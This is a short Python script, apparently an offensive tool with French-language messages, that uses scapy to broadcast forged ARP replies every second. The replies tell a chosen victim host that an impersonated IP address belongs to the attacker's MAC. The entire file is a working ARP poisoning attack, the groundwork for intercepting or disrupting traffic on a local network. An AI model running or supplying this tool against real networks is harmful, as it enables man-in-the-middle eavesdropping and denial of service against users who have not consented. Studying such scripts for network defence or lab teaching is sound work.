from scapy.all import *
import sys, time

victim = sys.argv[1]
fake_ip = sys.argv[2]

print(f"[*] ARP poisoning {victim} -> usurpation de {fake_ip}")

while True:
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,pdst=victim,psrc=fake_ip),iface="eth0",verbose=0)
    print(f"[+] Sent fake ARP: {fake_ip} is at notre MAC")
    time.sleep(1)
